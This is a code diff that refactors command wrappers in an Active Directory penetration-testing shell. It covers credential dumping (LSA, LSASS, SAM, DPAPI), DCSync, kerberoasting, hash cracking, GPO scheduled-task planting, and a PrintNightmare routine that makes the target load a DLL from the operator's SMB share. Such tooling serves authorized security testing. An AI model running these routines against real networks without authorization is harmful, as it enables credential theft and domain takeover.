-        Usage: get_flags <domain> <username> <password>
+        Usage:
+            get_flags <domain> <username> <password>
+            get_flags -d <domain> -u <username> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
 
         Requires that the domain's PDC is defined in the domains list and that a username and password
         have been specified for authentication.
@@ -18602,53 +19102,50 @@ class PentestShell:
             workflow_intent=workflow_intent,
         )
 
-    def do_check_autologon(self, domain, host, username, password):
+    def do_check_autologon(self, args):
         """Check for autologon credentials on the specified host using WinRM.
 
         This thin wrapper delegates to :mod:`adscan_internal.cli.winrm` so that
         the core logic can be reused by other UX layers.
+
+        Args:
+            args (str): A string containing space-separated arguments:
+                domain, host, username, password (see
+                ``adscan_internal.cli.winrm.run_do_check_autologon``).
         """
-        from adscan_internal.cli.winrm import check_autologon
+        from adscan_internal.cli.winrm import run_do_check_autologon
 
-        check_autologon(
-            self,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-        )
+        run_do_check_autologon(self, args)
 
-    def do_show_powershell_history(self, domain, host, username, password):
+    def do_show_powershell_history(self, args):
         """Show and analyze PowerShell history for a user on a given host via WinRM.
 
         This thin wrapper delegates to :mod:`adscan_internal.cli.winrm` so that
         the core logic can be reused by other UX layers.
+
+        Args:
+            args (str): A string containing space-separated arguments:
+                domain, host, username, password (see
+                ``adscan_internal.cli.winrm.run_do_show_powershell_history``).
         """
-        from adscan_internal.cli.winrm import show_powershell_history
+        from adscan_internal.cli.winrm import run_do_show_powershell_history
 
-        show_powershell_history(
-            self,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-        )
+        run_do_show_powershell_history(self, args)
 
-    def do_check_firefox_credentials(self, domain, host, username, password):
+    def do_check_firefox_credentials(self, args):
         """Check for Firefox credential files on the specified host using WinRM.
 
         This thin wrapper delegates to :mod:`adscan_internal.cli.winrm` so that
         the core logic can be reused by other UX layers.
-        """
-        from adscan_internal.cli.winrm import check_firefox_credentials
 
-        check_firefox_credentials(
-            self,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-        )
+        Args:
+            args (str): A string containing space-separated arguments:
+                domain, host, username, password (see
+                ``adscan_internal.cli.winrm.run_do_check_firefox_credentials``).
+        """
+        from adscan_internal.cli.winrm import run_do_check_firefox_credentials
+
+        run_do_check_firefox_credentials(self, args)
 
     def winrm_download(self, domain, host, username, password, paths, download_dir):
         """
@@ -18784,33 +19281,32 @@ class PentestShell:
             print_error("Error extracting Firefox passwords.")
             print_exception(show_locals=False, exception=e)
 
-    def do_check_powershell_transcripts(self, domain, host, username, password):
+    def do_check_powershell_transcripts(self, args):
         """Check for PowerShell transcripts on a host via WinRM and analyze them.
 
         This thin wrapper delegates to :mod:`adscan_internal.cli.winrm` so that
         the core logic can be reused by other UX layers.
+
+        Args:
+            args (str): A string containing space-separated arguments:
+                domain, host, username, password (see
+                ``adscan_internal.cli.winrm.run_do_check_powershell_transcripts``).
         """
-        from adscan_internal.cli.winrm import check_powershell_transcripts
+        from adscan_internal.cli.winrm import run_do_check_powershell_transcripts
 
-        check_powershell_transcripts(
-            self,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-        )
+        run_do_check_powershell_transcripts(self, args)
 
-    def do_check_winrm_sensitive_data(self, domain, host, username, password):
-        """Run deterministic sensitive-data analysis on a WinRM-accessible host."""
-        from adscan_internal.cli.winrm import run_winrm_sensitive_data_scan
+    def do_check_winrm_sensitive_data(self, args):
+        """Run deterministic sensitive-data analysis on a WinRM-accessible host.
 
-        run_winrm_sensitive_data_scan(
-            self,
-            domain=domain,
-            host=host,
-            username=username,
-            password=password,
-        )
+        Args:
+            args (str): A string containing space-separated arguments:
+                domain, host, username, password (see
+                ``adscan_internal.cli.winrm.run_do_check_winrm_sensitive_data``).
+        """
+        from adscan_internal.cli.winrm import run_do_check_winrm_sensitive_data
+
+        run_do_check_winrm_sensitive_data(self, args)
 
     def ask_for_smb_access(self, domain, host, username, password):
         """Delegate to smb module for consistency."""
@@ -18930,31 +19426,45 @@ class PentestShell:
         """
         Checks for SeImpersonatePrivilege on a specified host via MSSQL.
 
-        Args:
-            args (list): A list containing:
-                0: domain (str) - The domain name.
-                1: host (str) - The name or IP address of the host.
-                2: username (str) - The username to authenticate with MSSQL.
-                3: password (str) - The password for the specified username.
+        Usage:
+            mssql_check_impersonate <domain> <host> <username> <password>
+            mssql_check_impersonate -d <domain> --host <host> -u <username> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
 
         The function constructs a command to query the user's privileges on the target
         host and starts a thread to execute this command. It specifically checks for the
         SeImpersonatePrivilege, which is critical for certain security exploits.
         """
-        args = args.split()
-        if len(args) != 4:
-            print_warning(
-                "Usage: mssql_check_impersonate <domain> <host> <username> <password>"
-            )
+        from adscan_internal.cli.repl_args import ReplArgumentParser, parse_command_args
+
+        usage = (
+            "mssql_check_impersonate <domain> <host> <username> <password>  |  "
+            "mssql_check_impersonate -d <domain> --host <host> -u <username> -p <password>"
+        )
+        parser = ReplArgumentParser(prog="mssql_check_impersonate", add_help=False)
+        parser.add_argument("-d", "--domain", required=True)
+        parser.add_argument("--host", required=True)
+        parser.add_argument("-u", "--username", required=True)
+        parser.add_argument("-p", "--password", required=True)
+
+        namespace = parse_command_args(
+            tokens_source=args,
+            legacy_field_order=("domain", "host", "username", "password"),
+            parser=parser,
+            usage=usage,
+        )
+        if namespace is None:
             return
-        domain = args[0]
-        host = args[1]
-        username = args[2]
-        password = args[3]
         from adscan_internal.cli.mssql import run_mssql_check_impersonate
 
         return run_mssql_check_impersonate(
-            self, domain=domain, host=host, username=username, password=password
+            self,
+            domain=namespace.domain,
+            host=namespace.host,
+            username=namespace.username,
+            password=namespace.password,
         )
 
     def ask_for_dump_all_lsa(self, domain, username, password):
@@ -19024,15 +19534,14 @@ class PentestShell:
         """
         Dumps the LSA credentials from specified hosts within a domain.
 
-        Args:
-            args (list): A list containing:
-                0: domain (str) - The domain name.
-                1: username (str) - The username for authentication.
-                2: password (str) - The password for the specified username.
-                3: host (str) - The target host or 'All' for all hosts in the domain.
-                4: islocal (str) - Indicates if the operation is local ('true') or remote ('false').
+        Usage:
+            dump_lsa <domain> <username> <password> <host> <islocal>
+            dump_lsa -d <domain> -u <username> -p <password> --host <host> --islocal <true|false>
 
-        The function dumps the LSA credentials using the '{self.netexec_path} smb' tool.
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
+
+        The function dumps the LSA credentials using the native async SMB path.
         It supports dumping from a single host or all hosts in a specified domain.
         """
         from adscan_internal.cli.dumps import run_do_dump_lsa
@@ -19043,13 +19552,12 @@ class PentestShell:
         """
         Dumps the LSASS process credentials from specified hosts within a domain.
 
-        Args:
-            args (list): A list containing:
-                0: domain (str) - The domain name.
-                1: username (str) - The username for authentication.
-                2: password (str) - The password for the specified username.
-                3: host (str) - The target host or 'All' for all hosts in the domain.
-                4: islocal (str) - Indicates if the operation is local ('true') or remote ('false').
+        Usage:
+            dump_lsass <domain> <username> <password> <host> <islocal>
+            dump_lsass -d <domain> -u <username> -p <password> --host <host> --islocal <true|false>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
 
         Dumps LSASS via the native async SMB stack with PPL-aware backend
         selection. Supports a single host or all hosts in the domain.
@@ -19251,6 +19759,7 @@ class PentestShell:
                     )
             except Exception as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_info_debug(
                     "[local_reuse] Failed to create LocalAdminPassReuse attack steps."
                 )
@@ -19389,12 +19898,12 @@ class PentestShell:
         """
         Parses the given arguments and initiates the SAM credential dumping process.
 
-        Args:
-            args (str): A string containing the domain, username, password, host, and
-                        a flag indicating if the operation is local ('true') or remote ('false').
-
         Usage:
             dump_sam <domain> <username> <password> <host> <islocal>
+            dump_sam -d <domain> -u <username> -p <password> --host <host> --islocal <true|false>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
         """
         from adscan_internal.cli.dumps import run_do_dump_sam
 
@@ -19435,12 +19944,12 @@ class PentestShell:
         """
         Parses the given arguments and initiates the DPAPI credential dumping process.
 
-        Args:
-            args (str): A string containing the domain, username, password, host, and
-                        a flag indicating if the operation is local ('true') or remote ('false').
-
         Usage:
             dump_dpapi <domain> <username> <password> <host> <islocal>
+            dump_dpapi -d <domain> -u <username> -p <password> --host <host> --islocal <true|false>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
         """
         from adscan_internal.cli.dumps import run_do_dump_dpapi
 
@@ -19499,6 +20008,7 @@ class PentestShell:
         """
         from adscan_internal.cli.ldap import run_ldap_anonymous
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return run_ldap_anonymous(self, domain)
 
     # def do_nmap_ldap(self, domain):
@@ -19531,13 +20041,22 @@ class PentestShell:
 
     def printnightmare(self, target_domain):
         self.do_open_smb(target_domain)
+        pdc = self.domains_data[target_domain]['pdc']
         target = (
             f"{self.domain}/"
             f"{self.domains_data[self.domain]['username']}:"
             f"{self.domains_data[self.domain]['password']}@"
-            f"{self.domains_data[target_domain]['pdc']}"
+            f"{pdc}"
         )
-        dll_path = f"\\\\{self.myip}\\smbFolder\\pnightmare2.dll"
+        # The coerced PDC fetches the DLL back from us over UNC: advertise the IP
+        # that reaches back from the PDC's segment (per-target egress), not a
+        # single global myip that may be on the wrong NIC.
+        from adscan_internal.services.egress_resolver import (
+            resolve_callback_ip_for_target,
+        )
+
+        callback_ip = resolve_callback_ip_for_target(self, pdc, default=self.myip)
+        dll_path = f"\\\\{callback_ip}\\smbFolder\\pnightmare2.dll"
         command = f"printnightmare.py {shlex.quote(target)} {shlex.quote(dll_path)}"
         print_info("Exploiting PrintNightmare")
         self.execute_printnightmare(command, target_domain)
@@ -19561,6 +20080,7 @@ class PentestShell:
         """
         from adscan_internal.cli.kerberos import run_kerberoast
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_kerberoast(self, target_domain, auto_crack=auto_crack)
 
     def kerberoast_preauth(self, domain, user):
@@ -19603,7 +20123,12 @@ class PentestShell:
         """
         Performs a DCSync to extract NTLM hashes of domain users.
 
-        Usage: dcsync <domain> <username> <password>
+        Usage:
+            dcsync <domain> <username> <password>
+            dcsync -d <domain> -u <username> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
 
         Requires that the domain is defined in the domains list and that a username and password
         have been specified for authentication.
@@ -19646,7 +20171,7 @@ class PentestShell:
             f"Do you want to attempt to enumerate the password policy for domain {marked_domain}?",
             default=False,
         ):
-            self.do_netexec_pass_policy(domain)
+            self.do_password_policy(domain)
 
     def do_sync_clock_with_pdc(self, domain, verbose=False):
         """
@@ -19661,6 +20186,7 @@ class PentestShell:
         """
         from adscan_internal.cli.kerberos import sync_clock_with_pdc
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return sync_clock_with_pdc(self, domain, verbose=verbose)
 
     def _get_spraying_user_list_path(
@@ -19783,7 +20309,7 @@ class PentestShell:
         from adscan_internal.cli.spraying import run_spray_coverage
         from adscan_internal.interaction import is_non_interactive
 
-        domain = (domain or "").strip() or (self.current_domain or "")
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         if not domain:
             print_error("No domain specified. Usage: spraying <domain>")
             return
@@ -19812,7 +20338,7 @@ class PentestShell:
         from adscan_internal.cli.spraying import _run_pre2k_step
         from adscan_internal.interaction import is_non_interactive
 
-        domain = (domain or "").strip() or (self.current_domain or "")
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         if not domain:
             print_error("No domain specified. Usage: pre2k <domain>")
             return
@@ -19962,34 +20488,39 @@ class PentestShell:
 
         return execute_zerologon_restore(self, command=command)
 
-    def do_netexec_pass_policy(self, domain):
+    def do_password_policy(self, domain):
         """
-        Displays the password policy for the specified domain.
+        Displays the domain password policy read from ADscan's native posture
+        system (LDAP), not a subprocess tool.
 
         Args:
             domain (str): The domain for which to display the password policy.
         """
         from adscan_internal.cli.smb import run_pass_policy
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return run_pass_policy(self, domain=domain)
 
-    def do_netexec_smbv1(self, domain):
+    def do_smbv1_audit(self, domain):
         """Audit SMBv1 exposure across the selected SMB target scope."""
         from adscan_internal.cli.smb import run_smbv1_audit
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return run_smbv1_audit(self, domain=domain)
 
-    def do_netexec_obsolete(self, domain):
-        """Audit obsolete operating systems exposed in LDAP for the domain."""
-        from adscan_internal.cli.ldap import run_netexec_obsolete
+    def do_obsolete_os_audit(self, domain):
+        """Audit obsolete operating systems from the native collector's inventory."""
+        from adscan_internal.cli.ldap import run_obsolete_os_audit
 
-        return run_netexec_obsolete(self, domain=domain)
+        domain = resolve_repl_domain_or_default(self, domain) or ""
+        return run_obsolete_os_audit(self, domain=domain)
 
-    def do_netexec_ldap_security(self, domain):
+    def do_ldap_security_audit(self, domain):
         """Audit LDAP signing and channel binding posture on known Domain Controllers."""
-        from adscan_internal.cli.ldap import run_netexec_ldap_security
+        from adscan_internal.cli.ldap import run_ldap_security_audit
 
-        return run_netexec_ldap_security(self, domain=domain)
+        domain = resolve_repl_domain_or_default(self, domain) or ""
+        return run_ldap_security_audit(self, domain=domain)
 
     def cracking(self, type, domain, hash, failed=False):
         from adscan_internal.cli.cracking import run_cracking
@@ -20007,12 +20538,17 @@ class PentestShell:
         """
         Command to crack Active Directory hashes.
 
-        Usage: cracking <type> <domain> <hash>
+        Usage:
+            cracking <type> <domain> <hash>
+            cracking --type <type> -d <domain> --hash <hash>
 
         Where:
-        - <type> is the type of hash to crack (asreproast, kerberoast, timeroast, NTLMv2)
+        - <type> is the type of hash to crack (asreproast, kerberoast, NTLMv2)
         - <domain> is the Active Directory domain of the hash
-        - <hash> is the hash to crack
+        - <hash> is the hash (or hash file path) to crack
+
+        Both forms are permanently supported. In the flag form, a value starting
+        with "-" needs the "=" spelling: --hash=-oddvalue
 
         This command uses hashcat to crack the hash with the wordlist selected by the user.
         """
@@ -20033,6 +20569,7 @@ class PentestShell:
         """
         from adscan_internal.cli.kerberos import run_asreproast
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_asreproast(self, target_domain, auto_crack=auto_crack)
 
     def do_timeroast(self, target_domain):
@@ -20052,28 +20589,33 @@ class PentestShell:
         """
         from adscan_internal.cli.timeroast import run_timeroast_quick_win
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_timeroast_quick_win(self, target_domain)
 
-    def do_netexec_gpp_autologin(self, target_domain):
+    def do_gpp_autologin(self, target_domain):
         """
-        Executes netexec to enumerate GPP autologin files in the specified domain.
+        Enumerates GPP autologin files in the specified domain via the native
+        SMB share reader (SYSVOL Group Policy Preferences scan).
 
         Args:
             target_domain (str): The domain in which to search for GPP autologin files.
         """
         from adscan_internal.cli.smb import run_gpp_autologin
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_gpp_autologin(self, target_domain=target_domain)
 
-    def do_netexec_gpp_passwords(self, target_domain):
+    def do_gpp_passwords(self, target_domain):
         """
-        Executes netexec to enumerate GPP passwords in the specified domain.
+        Enumerates GPP passwords in the specified domain via the native SMB
+        share reader (SYSVOL Group Policy Preferences scan).
 
         Args:
             target_domain (str): The domain in which to search for GPP passwords.
         """
         from adscan_internal.cli.smb import run_gpp_passwords
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_gpp_passwords(self, target_domain=target_domain)
 
     def manspider_passwd_files(self, target_domain, username, password, shares, hosts):
@@ -20419,32 +20961,35 @@ class PentestShell:
             # to a plain blocking call so the hunt still completes.
             return _run_manspider()
 
-    def do_netexec_smb_descriptions(self, domain):
+    def do_smb_user_descriptions(self, domain):
         """
-        Executes an SMB command to search for user descriptions in the specified domain.
+        Searches user account descriptions for embedded credentials via a
+        native SMB null-session SAMR read for the specified domain.
 
         Args:
             domain (str): The domain for which to search user descriptions.
         """
         from adscan_internal.cli.smb import run_smb_descriptions
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return run_smb_descriptions(self, domain=domain)
 
-    def do_netexec_guest(self, domain):
+    def do_smb_guest_shares(self, domain):
         """
-        Executes a guest SMB session command to enumerate shares for the specified domain.
-
-        Constructs a command to retrieve a list of shares using a guest session for the domain's
-        primary domain controller (PDC). The output is logged to a file and executed in a separate thread.
+        Enumerates shares reachable with a guest SMB session for the specified
+        domain via a native SMB connection to the domain's primary domain
+        controller (PDC). The output is logged to a file and executed in a
+        separate thread.
 
         Args:
-            domain (str): The domain for which to execute the guest session command.
+            domain (str): The domain for which to enumerate guest-accessible shares.
         """
         from adscan_internal.cli.smb import run_guest_shares
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_guest_shares(self, domain=domain)
 
-    def netexec_auth_shares(self, target_domain, username, password):
+    def smb_auth_shares(self, target_domain, username, password):
         from adscan_internal.cli.smb import run_auth_shares
 
         run_auth_shares(
@@ -20454,20 +20999,25 @@ class PentestShell:
             password=password,
         )
 
-    def do_netexec_auth_shares(self, args):
+    def do_smb_auth_shares(self, args):
         """
-        Executes a netexec command to enumerate shares for the specified domain.
+        Enumerates authenticated SMB shares for the specified domain.
 
-        Usage: netexec_shares <domain> <username> <password>
+        Usage:
+            smb_auth_shares <domain> <username> <password>
+            smb_auth_shares -d <domain> -u <username> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
 
         Args:
             target_domain (str): The domain for which to execute the authenticated session command.
             username (str): The username for authentication.
             password (str): The password for authentication.
         """
-        from adscan_internal.cli.smb import run_netexec_auth_shares_from_args
+        from adscan_internal.cli.smb import run_smb_auth_shares_from_args
 
-        run_netexec_auth_shares_from_args(self, args)
+        run_smb_auth_shares_from_args(self, args)
 
     def do_cves(self, args):
         """Native CVE scanner.
@@ -20497,6 +21047,7 @@ class PentestShell:
     def do_rid_cycling(self, domain):
         from adscan_internal.cli.smb import run_rid_cycling
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_rid_cycling(self, domain=domain)
 
     def rid_cycling_local(self, domain):
@@ -20617,6 +21168,7 @@ class PentestShell:
             telemetry.capture("users_enumerated", properties)
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
 
         if filename in {
             "control_exposure_identities.txt",
@@ -20718,6 +21270,7 @@ class PentestShell:
                         existing_entries.append(cleaned)
             except OSError as exc:
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(
                     f"[users] Failed to read existing entries from "
                     f"{mark_sensitive(users_file, 'path')}: {exc}"
@@ -20901,6 +21454,7 @@ class PentestShell:
             telemetry.capture("computers_enumerated", properties)
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
 
         if comp_file == "enabled_computers_with_laps.txt":
             self._display_items(cleaned, "Computers with LAPS")
@@ -21020,18 +21574,20 @@ class PentestShell:
         """
         from adscan_internal.cli.ldap import run_enum_with_users
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_enum_with_users(self, domain)
 
-    def execute_netexec_pass_policy(self, domain):
-        from adscan_internal.cli.smb import execute_netexec_pass_policy
+    def execute_password_policy(self, domain):
+        """Display the domain password policy from ADscan's native posture data."""
+        from adscan_internal.cli.smb import execute_password_policy
 
-        execute_netexec_pass_policy(shell=self, domain=domain)
+        execute_password_policy(shell=self, domain=domain)
 
-    def execute_netexec_obsolete(self, domain):
+    def execute_obsolete_os_audit(self, domain):
         """Audit obsolete operating systems from the native collector inventory."""
-        from adscan_internal.cli.ldap import execute_netexec_obsolete
+        from adscan_internal.cli.ldap import execute_obsolete_os_audit
 
-        execute_netexec_obsolete(shell=self, domain=domain)
+        execute_obsolete_os_audit(shell=self, domain=domain)
 
     def execute_rdp_access(self, command):
         """Execute an RDP access command.
@@ -21512,6 +22068,7 @@ class PentestShell:
                                 debug_printer=print_info_debug,
                             ):
                                 telemetry.capture_exception(exc)
+                                print_exception(exception=exc)
                 elif type == "autologin":
                     parsed_autologin = parse_netexec_gpp_autologin_credentials(
                         output_str
@@ -21568,6 +22125,7 @@ class PentestShell:
                                 debug_printer=print_info_debug,
                             ):
                                 telemetry.capture_exception(exc)
+                                print_exception(exception=exc)
 
                 if found_passwords:
                     print_success("Passwords found in SYSVOL (GPP).")
@@ -21771,6 +22329,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             source_context = None
         self.spraying_with_passwords(
             domain,
@@ -22246,6 +22805,7 @@ class PentestShell:
                 saved_files[cred_type] = file_path
             except Exception as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 print_warning(f"Error saving {cred_type} credentials to file: {e}")
 
         return saved_files
@@ -22397,6 +22957,7 @@ class PentestShell:
         """
         from adscan_internal.cli.ldap import extract_base_dn
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         extract_base_dn(self, domain)
 
     def is_user_dc(self, domain, target_host):
@@ -22536,6 +23097,7 @@ class PentestShell:
                 snapshot = load_or_build_identity_risk_snapshot(self, domain)
             except Exception as snap_exc:  # noqa: BLE001
                 telemetry.capture_exception(snap_exc)
+                print_exception(exception=snap_exc)
                 snapshot = None
             if isinstance(snapshot, dict) and snapshot.get("users"):
                 uname = username.split("@", 1)[0].strip().lower()
@@ -23089,6 +23651,7 @@ class PentestShell:
                 )
             except Exception as _exc:  # noqa: BLE001
                 telemetry.capture_exception(_exc)
+                print_exception(exception=_exc)
 
             from adscan_internal.services.domain_compromise_promotion import (
                 CompromiseEvidence,
@@ -23116,6 +23679,7 @@ class PentestShell:
                 )
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(f"[backup-ops] cleanup helper failed: {exc}")
 
             if self.type == "ctf":
@@ -23167,6 +23731,7 @@ class PentestShell:
                 )
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(f"[backup-ops] escalation helper failed: {exc}")
 
         if selected_key == "read_only_domain_controllers":
@@ -23186,6 +23751,7 @@ class PentestShell:
                 )
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(f"[rodc] escalation helper failed: {exc}")
 
         if selected_key == "account_operators":
@@ -23205,6 +23771,7 @@ class PentestShell:
                 )
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(f"[acct-ops] escalation helper failed: {exc}")
 
         if selected_key == "exchange_windows_permissions":
@@ -23224,6 +23791,7 @@ class PentestShell:
                 )
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(
                     f"[exchange-windows-permissions] escalation helper failed: {exc}"
                 )
@@ -23245,6 +23813,7 @@ class PentestShell:
                 )
             except Exception as exc:  # pragma: no cover - best effort
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(
                     f"[exchange-trusted-subsystem] escalation helper failed: {exc}"
                 )
@@ -23321,6 +23890,7 @@ class PentestShell:
             return self._parse_privileged_group_output(raw_text)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_warning(
                 f"BloodHound group lookup raised an exception: {exc}. Falling back."
             )
@@ -23586,6 +24156,7 @@ class PentestShell:
         """Wrapper for enum_cross_domain_acl command."""
         from adscan_internal.cli.privileges import run_enum_cross_domain_acl
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_enum_cross_domain_acl(self, domain=domain)
 
     def raise_child(self, domain, username, password):
@@ -23771,14 +24342,14 @@ class PentestShell:
                         print_success(
                             f"Automatically enumerating post-auth service access for user {marked_username}"
                         )
-                        self.netexec_user_postauth_access(domain, username, password)
+                        self.user_postauth_access(domain, username, password)
                     else:
                         marked_username = mark_sensitive(username, "user")
                         if Confirm.ask(
                             f"Do you want to enumerate post-auth service access for user {marked_username}?",
                             default=True,
                         ):
-                            self.netexec_user_postauth_access(
+                            self.user_postauth_access(
                                 domain, username, password
                             )
                         else:
@@ -23839,21 +24410,21 @@ class PentestShell:
                     print_success(
                         f"Automatically enumerating post-auth service access for user {marked_username}"
                     )
-                    self.netexec_user_postauth_access(domain, username, password)
+                    self.user_postauth_access(domain, username, password)
                 else:
                     marked_username = mark_sensitive(username, "user")
                     respuesta = Confirm.ask(
                         f"Do you want to enumerate post-auth service access for user {marked_username}?"
                     )
                     if respuesta:  # Prompt.ask for (y/n) returns boolean
-                        self.netexec_user_postauth_access(domain, username, password)
+                        self.user_postauth_access(domain, username, password)
                     else:
                         marked_username = mark_sensitive(username, "user")
                         print_info_verbose(
                             f"Post-auth service enumeration for user {marked_username} has been cancelled."
                         )
 
-    def netexec_user_postauth_access(
+    def user_postauth_access(
         self, domain, username, password, hosts: list[str] | None = None
     ):
         """Wrapper for post-auth user access orchestration used by ask_for_user_privs.
@@ -23875,44 +24446,48 @@ class PentestShell:
             include_acl_enumeration=False,
         )
 
-    def netexec_user_privs(
-        self, domain, username, password, hosts: list[str] | None = None
-    ):
-        """Backward-compatible alias for post-auth user access orchestration."""
-        self.netexec_user_postauth_access(
-            domain,
-            username,
-            password,
-            hosts=hosts,
+    def _dispatch_user_postauth_access(self, args, *, prog: str):
+        """Parsing for the ``user_postauth_access`` REPL command.
+
+        Usage:
+            <prog> <domain> <user> <password>
+            <prog> -d <domain> -u <user> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
+        """
+        from adscan_internal.cli.privileges import run_user_postauth_access
+        from adscan_internal.cli.repl_args import ReplArgumentParser, parse_command_args
+
+        usage = f"{prog} <domain> <user> <password>  |  {prog} -d <domain> -u <user> -p <password>"
+        parser = ReplArgumentParser(prog=prog, add_help=False)
+        parser.add_argument("-d", "--domain", required=True)
+        parser.add_argument("-u", "--username", required=True)
+        parser.add_argument("-p", "--password", required=True)
+
+        namespace = parse_command_args(
+            tokens_source=args,
+            legacy_field_order=("domain", "username", "password"),
+            parser=parser,
+            usage=usage,
         )
-
-    def do_netexec_user_privs(self, args):
-        """Backward-compatible wrapper for netexec_user_postauth_access command."""
-        from adscan_internal.cli.privileges import run_netexec_user_postauth_access
-
-        args = args.split()
-        if len(args) != 3:
-            self.console.print("Usage: netexec_user_privs <domain> <user> <password>")
+        if namespace is None:
             return
-        domain, username, password = args
-        run_netexec_user_postauth_access(
-            self, domain=domain, username=username, password=password
+        run_user_postauth_access(
+            self, domain=namespace.domain, username=namespace.username, password=namespace.password
         )
 
-    def do_netexec_user_postauth_access(self, args):
-        """Enumerate post-auth host/service access for a domain user."""
-        from adscan_internal.cli.privileges import run_netexec_user_postauth_access
+    def do_user_postauth_access(self, args):
+        """Enumerate post-auth host/service access for a domain user.
 
-        args = args.split()
-        if len(args) != 3:
-            self.console.print(
-                "Usage: netexec_user_postauth_access <domain> <user> <password>"
-            )
-            return
-        domain, username, password = args
-        run_netexec_user_postauth_access(
-            self, domain=domain, username=username, password=password
-        )
+        Usage:
+            user_postauth_access <domain> <user> <password>
+            user_postauth_access -d <domain> -u <user> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
+        """
+        self._dispatch_user_postauth_access(args, prog="user_postauth_access")
 
     def ask_for_exploit_delegation(
         self, domain, username, password, delegation_type, delegation_to
@@ -24152,6 +24727,10 @@ class PentestShell:
 
         Usage:
             enumerate_user_aces <domain> <user> <password>
+            enumerate_user_aces -d <domain> -u <user> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret value
+        starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
 
         Delegates to the LDAP CLI helper to keep argument parsing and UX outside
         of the main CLI monolith.
@@ -24194,6 +24773,7 @@ class PentestShell:
             return success
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             print_error(f"Error enabling user {marked_target}: {e}")
             return False
 
@@ -24256,6 +24836,7 @@ class PentestShell:
             return success
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             print_error(f"Error restoring {marked_target}: {e}")
             return False
 
@@ -24293,6 +24874,7 @@ class PentestShell:
 
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             marked_target_computer = mark_sensitive(target_computer, "hostname")
             print_error(
                 "An exception occurred while trying to enable computer account "
@@ -24413,6 +24995,27 @@ class PentestShell:
         from adscan_internal.cli.gpo_abuse_handler import run_exploit_gpo_abuse
         run_exploit_gpo_abuse(self)
 
+    def exploit_gpo_immediate_task_for_step(
+        self, context, *, target_dn=None, target_object_id=None
+    ) -> bool:
+        """Plant a GPO Immediate Scheduled Task for one attack-path ACE step.
+
+        Non-interactive, single-target entry point used by the attack-path
+        execution engine when a GenericAll/GenericWrite → GPO edge is executed.
+        Delegates to the shared handler, which resolves the path-fixed GPO into
+        a writable candidate and plants + auto-rolls-back via the exploitation
+        service, recording the change and its undo in the session ledger.
+        """
+        from adscan_internal.cli.gpo_abuse_handler import (
+            run_exploit_gpo_immediate_task_for_step,
+        )
+        return run_exploit_gpo_immediate_task_for_step(
+            self,
+            context,
+            target_dn=target_dn,
+            target_object_id=target_object_id,
+        )
+
